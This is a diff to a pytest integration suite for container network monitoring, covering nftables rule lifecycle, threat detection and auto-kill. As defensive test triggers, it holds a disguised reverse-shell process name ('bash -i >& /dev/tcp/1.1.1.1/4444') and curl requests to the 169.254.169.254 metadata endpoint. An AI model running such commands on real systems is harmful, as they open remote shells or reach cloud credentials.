@@ -22,6 +22,8 @@ from pathlib import Path
 
 import pytest
 
+from support.monitoring import coi_session_logs
+
 
 def get_container_name_from_workspace(workspace, slot=1):
     """Generate expected container name from workspace path."""
@@ -52,6 +54,17 @@ def get_container_ip(container_name):
     return None
 
 
+def wait_for_container_ip(container_name, timeout=30):
+    """Wait for the container's eth0 IPv4 address (DHCP can lag behind Running)."""
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        ip = get_container_ip(container_name)
+        if ip:
+            return ip
+        time.sleep(1)
+    return None
+
+
 def get_container_state(name):
     """Get container state."""
     result = subprocess.run(
@@ -63,7 +76,9 @@ def get_container_state(name):
     if result.returncode != 0:
         return "Unknown"
     containers = json.loads(result.stdout)
-    return containers[0].get("status", "Unknown") if containers else "Unknown"
+    # `incus list <name>` matches by prefix; pick the exact name.
+    match = [c for c in containers if c.get("name") == name]
+    return match[0].get("status", "Unknown") if match else "Unknown"
 
 
 def get_nft_threat_events(container_name):
@@ -221,11 +236,10 @@ class TestNFTRuleManagement:
         try:
             # Wait for container to be ready
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Poll for NFT rules (may take a moment after container is running)
             nft_ready = False
@@ -245,7 +259,8 @@ class TestNFTRuleManagement:
             cleanup_container(container_name, coi_binary, env=coi_monitoring_env)
 
     def test_rules_removed_on_session_end(self, test_workspace, coi_binary, coi_monitoring_env):
-        """Verify nftables rules are cleaned up when session ends."""
+        """nftables rules outlive the coi shell command and are removed when the
+        session's container stops."""
         slot = 51
         container_name = get_container_name_from_workspace(test_workspace, slot)
 
@@ -267,11 +282,10 @@ class TestNFTRuleManagement:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Wait for NFT rules to be created (monitoring daemon may take time to set up)
             nft_ready = False
@@ -282,22 +296,33 @@ class TestNFTRuleManagement:
                 time.sleep(2)
             assert nft_ready, "Rules should exist while monitoring"
 
-            # Stop session
+            # End the coi shell command. The container keeps running, and so
+            # does its monitoring (the session supervisor owns it), so the
+            # rules must stay.
             proc.terminate()
             try:
                 proc.wait(timeout=10)
             except subprocess.TimeoutExpired:
                 proc.kill()
-            time.sleep(3)
-
-            # Check rules are gone
-            result = subprocess.run(
-                ["sudo", "-n", "nft", "list", "ruleset"],
-                capture_output=True,
-                text=True,
-                timeout=10,
+            time.sleep(5)
+            assert check_nft_rules_exist(container_ip), (
+                "monitoring rules disappeared while the container was still running"
             )
-            assert f"NFT_COI[{container_ip}]" not in result.stdout, "Rules not cleaned up"
+
+            # Stopping the container ends the session: the supervisor removes
+            # the rules.
+            subprocess.run(
+                ["incus", "stop", "--force", container_name],
+                capture_output=True,
+                timeout=60,
+            )
+            gone = False
+            for _ in range(30):
+                if not check_nft_rules_exist(container_ip):
+                    gone = True
+                    break
+                time.sleep(1)
+            assert gone, f"NFT rules for {container_ip} not cleaned up after the container stopped"
 
         finally:
             proc.terminate()
@@ -329,11 +354,10 @@ class TestNFTRuleManagement:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Wait until BOTH NFT_COI and NFT_SUSPICIOUS rules are present in the
             # same ruleset snapshot. Using a single snapshot eliminates the race where
@@ -358,10 +382,7 @@ class TestNFTRuleManagement:
                         break
                 time.sleep(1)
 
-            if not nft_ready:
-                pytest.skip(
-                    "NFT rules not fully created - monitoring may not be properly initialized"
-                )
+            assert nft_ready, f"NFT monitoring rules never appeared for {container_ip}"
 
             # Should have general and suspicious rules (DNS is optional config)
             assert f"NFT_COI[{container_ip}]" in ruleset, "General traffic rule not found"
@@ -409,11 +430,10 @@ class TestNetworkThreatDetection:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Wait for NFT rules to be created (confirms monitoring pipeline is active)
             nft_ready = False
@@ -423,8 +443,7 @@ class TestNetworkThreatDetection:
                     break
                 time.sleep(1)
 
-            if not nft_ready:
-                pytest.skip("NFT rules not created - monitoring may not be properly initialized")
+            assert nft_ready, f"NFT monitoring rules never appeared for {container_ip}"
 
             # Attempt to access metadata endpoint from inside container
             subprocess.run(
@@ -490,11 +509,10 @@ class TestNetworkThreatDetection:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Wait for NFT rules to be created (confirms monitoring pipeline is active)
             nft_ready = False
@@ -504,8 +522,7 @@ class TestNetworkThreatDetection:
                     break
                 time.sleep(1)
 
-            if not nft_ready:
-                pytest.skip("NFT rules not created - monitoring may not be properly initialized")
+            assert nft_ready, f"NFT monitoring rules never appeared for {container_ip}"
 
             # Access metadata endpoint (should trigger kill)
             subprocess.run(
@@ -564,11 +581,10 @@ class TestNetworkThreatDetection:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Generate traffic and poll the NFT_COI counter. The counter rule is
             # in place from session start, but traffic generation + counting is
@@ -654,23 +670,26 @@ class TestAuditLogging:
 
             try:
                 if not wait_for_container_ready(container_name, timeout=60):
-                    pytest.skip("Container failed to start")
+                    pytest.fail(f"Container {container_name} did not start")
 
                 # Wait for the NFT monitoring daemon to actually start before
                 # triggering traffic. Without this, the curl may fire before the
                 # daemon is ready to observe it and write audit logs.
+                # The session supervisor runs the daemon and writes to the session
+                # log; coi shell's stderr covers the in-process fallback.
                 daemon_started = False
+                output = ""
                 for _ in range(30):
                     time.sleep(1)
-                    stderr_content = stderr_file.read_text()
-                    if "[security] NFT network monitoring started" in stderr_content:
+                    output = stderr_file.read_text() + coi_session_logs(container_name)
+                    if "[security] NFT network monitoring started" in output:
                         daemon_started = True
                         break
 
                 if not daemon_started:
-                    pytest.skip(
+                    pytest.fail(
                         "NFT monitoring daemon did not start in time. "
-                        f"stderr:\n{stderr_file.read_text()}"
+                        f"coi shell stderr and session logs:\n{output}"
                     )
 
                 # Trigger some network activity
@@ -745,19 +764,33 @@ class TestDaemonLifecycle:
             )
 
             try:
-                # Poll stderr for startup message instead of fixed sleep. The
+                # Poll for the startup message instead of a fixed sleep. The
                 # window is generous (CI runners are frequently overloaded and the
-                # daemon starts after full session setup).
-                stderr_content = ""
+                # daemon starts after full session setup). The session supervisor
+                # runs the monitor and writes to the session log, so look there as
+                # well as at coi shell's own stderr (its in-process fallback).
+                output = ""
                 started = False
                 for _ in range(90):
                     time.sleep(1)
-                    stderr_content = stderr_file.read_text()
-                    if "[security] NFT network monitoring started" in stderr_content:
+                    output = stderr_file.read_text() + coi_session_logs(container_name)
+                    if "[security] NFT network monitoring started" in output:
                         started = True
                         break
 
-                assert started, f"NFT daemon startup message not found. stderr:\n{stderr_content}"
+                assert started, (
+                    f"NFT daemon startup message not found in coi shell stderr or the "
+                    f"session logs:\n{output}"
+                )
+
+                # The user's terminal (coi shell's stderr) must still confirm that
+                # monitoring is running: the supervisor's notice, or the monitors'
+                # own lines when coi shell fell back to running them in-process.
+                terminal = stderr_file.read_text()
+                assert (
+                    "[supervisor] Running security monitoring" in terminal
+                    or "[security] NFT network monitoring started" in terminal
+                ), f"no monitoring confirmation on the terminal:\n{terminal}"
 
             finally:
                 proc.terminate()
@@ -800,11 +833,10 @@ class TestNFTRuleCleanupOnKill:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Poll for NFT rules (may take a moment after container is running)
             nft_ready = False
@@ -864,11 +896,10 @@ class TestNFTRuleCleanupOnKill:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Poll for NFT rules (may take a moment after container is running)
             nft_ready = False
@@ -959,11 +990,10 @@ class TestNFTRuleCleanupOnShutdown:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Wait for NFT rules to be created (monitoring daemon may take time to set up)
             nft_ready = False
@@ -1072,36 +1102,41 @@ class TestNFTCOIRuleCleanupOnAutoKill:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Verify nft rules exist before triggering kill
             # (restricted mode creates rules in ip coi forward)
-            if not check_nft_coi_rules_exist(container_ip):
-                pytest.skip("No nft coi forward rules created (chain may not exist yet)")
+            deadline = time.time() + 15
+            while not check_nft_coi_rules_exist(container_ip) and time.time() < deadline:
+                time.sleep(1)
+            assert check_nft_coi_rules_exist(container_ip), (
+                f"No nft coi forward rules created for {container_ip}"
+            )
 
-            # Trigger auto-kill by accessing metadata endpoint (CRITICAL threat)
-            subprocess.run(
+            # Trigger the auto-kill with a reverse-shell process (CRITICAL).
+            # Not a metadata-endpoint access: restricted mode's firewall blocks
+            # 169.254.169.254, and on CI that blocked attempt was never detected
+            # (the container kept running), so it can't drive this test.
+            subprocess.Popen(
                 [
                     "incus",
                     "exec",
                     container_name,
                     "--",
-                    "curl",
-                    "-m",
-                    "3",
-                    "http://169.254.169.254/",
+                    "bash",
+                    "-c",
+                    "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
                 ],
-                capture_output=True,
-                timeout=10,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
             )
 
             # Wait for responder to detect threat and kill container
             killed = False
-            for _ in range(30):
+            for _ in range(40):
                 time.sleep(1)
                 state = get_container_state(container_name)
                 if state in ("Stopped", "Unknown"):
@@ -1222,12 +1257,11 @@ class TestVethZoneCleanupOnAutoKill:
 
         try:
             if not wait_for_container_ready(container_name, timeout=60):
-                pytest.skip("Container failed to start")
+                pytest.fail(f"Container {container_name} did not start")
 
             # Get container IP and verify NFT rules are set up before proceeding
-            container_ip = get_container_ip(container_name)
-            if not container_ip:
-                pytest.skip("Container has no IP address")
+            container_ip = wait_for_container_ip(container_name)
+            assert container_ip, f"Container {container_name} got no IP address"
 
             # Wait for NFT rules to be created (critical for this test)
             nft_ready = False
@@ -1237,13 +1271,11 @@ class TestVethZoneCleanupOnAutoKill:
                     break
                 time.sleep(1)
 
-            if not nft_ready:
-                pytest.skip("NFT rules not created - monitoring may not be properly initialized")
+            assert nft_ready, f"NFT monitoring rules never appeared for {container_ip}"
 
             # Get veth name BEFORE killing (needed for cleanup verification)
             veth_name = get_container_veth_name(container_name)
-            if not veth_name:
-                pytest.skip("Could not get veth name for container")
+            assert veth_name, f"Could not get the veth name for {container_name}"
 
             # Note: We don't skip if veth isn't in zone - the cleanup should still run
             # and the test verifies the end state (veth not in any zone after cleanup)
